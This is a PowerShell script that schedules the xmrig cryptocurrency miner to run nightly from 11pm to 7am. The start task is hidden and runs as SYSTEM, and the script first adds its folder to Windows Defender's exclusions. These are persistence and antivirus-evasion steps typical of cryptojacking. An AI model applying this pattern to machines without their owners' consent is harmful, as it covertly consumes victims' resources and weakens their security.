# Setup scheduled task to run xmrig each night
$scriptpath = $MyInvocation.MyCommand.Path
$homedir = Split-Path $scriptpath
$ProgramDir = $homedir + '\xmrig'
$ProgramExe = $ProgramDir + '\xmrig.exe'

# Add exception to Windows Defender
Add-MpPreference -ExclusionPath $homedir

$settings = New-ScheduledTaskSettingsSet -Hidden -WakeToRun -ExecutionTimeLimit 07:55:00 -Priority 0
$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Setup schedule to start xmrig daily at 11pm

$action = New-ScheduledTaskAction -Execute $ProgramExe

$trigger = New-ScheduledTaskTrigger -Daily -At 11pm

Register-ScheduledTask StartNightly -Action $action -Settings $settings -Principal $principal -Trigger $trigger -Description "Start xmrig"


# Setup schedule to stop xmrig daily at 7am

$stopAction = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-command "taskkill /im xmrig.exe /f"'

$stopTrigger =  New-ScheduledTaskTrigger -Daily -At 7am

Register-ScheduledTask StopNightly -Action $stopAction -Trigger $stopTrigger -Principal $principal -Description "Stop xmrig"
